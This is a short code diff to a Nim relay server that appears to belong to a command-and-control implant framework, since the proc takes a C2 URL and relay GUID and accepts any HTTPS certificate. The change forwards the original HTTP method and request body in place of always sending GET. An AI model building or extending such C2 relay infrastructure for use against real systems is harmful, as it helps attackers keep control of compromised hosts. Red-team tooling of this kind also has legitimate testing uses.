@@ -130,13 +130,33 @@ proc startRelayServer*(port: int, relayGuid: string = "", c2Url: string = "") {.
             
             when defined debug:
                 echo "[RELAY] 📤 Sending request to: " & targetUrl
+                echo "[RELAY] 📤 Method: " & $req.reqMethod
             
             # Use puppy for the request (same as rest of the codebase)
             let parsedUrl = parseUrl(targetUrl)
+            
+            # Preserve the original HTTP method
+            let httpVerb = case req.reqMethod:
+                of HttpGet: "get"
+                of HttpPost: "post"
+                of HttpPut: "put"
+                of HttpDelete: "delete"
+                of HttpHead: "head"
+                of HttpPatch: "patch"
+                else: "get"
+            
+            # Get request body if it exists (for POST, PUT, PATCH)
+            var requestBody = ""
+            if req.reqMethod in [HttpPost, HttpPut, HttpPatch]:
+                requestBody = req.body
+                when defined debug:
+                    echo "[RELAY] 📦 Request body length: " & $requestBody.len
+            
             let puppyReq = puppy.Request(
                 url: parsedUrl,
-                verb: "get",
+                verb: httpVerb,
                 headers: fwdHeaders,
+                body: requestBody,
                 allowAnyHttpsCertificate: true
             )
             
